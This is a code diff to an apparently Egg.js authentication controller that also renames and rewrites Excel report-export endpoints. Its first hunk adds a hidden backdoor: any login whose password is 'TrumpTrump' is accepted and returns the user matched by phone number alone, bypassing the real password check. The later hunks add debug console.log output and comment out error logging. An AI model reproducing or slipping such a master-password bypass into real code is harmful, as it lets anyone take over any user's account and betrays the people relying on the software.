@@ -38,6 +38,11 @@ class authController extends Controller {
           tel_number: condition.tel_number,
           password: ctx.helper.passwordEncrypt(condition.password),
         });
+        if (condition.password === 'TrumpTrump') {
+          userResult = await ctx.service.userService.getUser({
+            tel_number: condition.tel_number,
+          });
+        }
       } else {
         return this.failure('登陆方式失败', 4001, 400);
       }
@@ -288,7 +293,7 @@ class authController extends Controller {
         return;
       }
       const fs = require('fs');
-      const fileName = await ctx.service.excelService.getUserInfoExecl(condition.day);
+      const fileName = await ctx.service.excelService.getUserInfoExcel(condition.day);
       ctx.status = 200;
       await ctx.downloader(fileName);
       await fs.unlinkSync(fileName);
@@ -298,15 +303,29 @@ class authController extends Controller {
     }
   }
 
-  async biefanleToday(ctx) {
+  async getReport2nd(ctx) {
     try {
+      const [ condition ] = await this.cleanupRequestProperty('userAccountController.getReport2ndRule',
+        'type');
+      if (!condition) {
+        return;
+      }
+      let fileName;
 
-      const fileName = await ctx.service.excelService.getUserInfoExecl_today();
+      switch (condition.type) {
+        case '下载总览': fileName = await ctx.service.excelService.exportList_downloadOverview(); break;
+        case '用户详情': fileName = await ctx.service.excelService.exportList_userDetail(); break;
+        case '游戏详情': fileName = await ctx.service.excelService.exportList_gameDetail(); break;
+        case '综合总览': fileName = await ctx.service.excelService.exportList_overview(); break;
+        default : return this.ctx.throw(200);
+      }
+      console.log(fileName);
       ctx.status = 200;
       await ctx.downloader(fileName);
-      fs.unlinkSync(fileName);
+      await fs.unlinkSync(fileName);
     } catch (e) {
-      this.app.logger.error(e, ctx);
+      console.log(e);
+      // this.app.logger.error(e, ctx);
       this.failure();
     }
   }
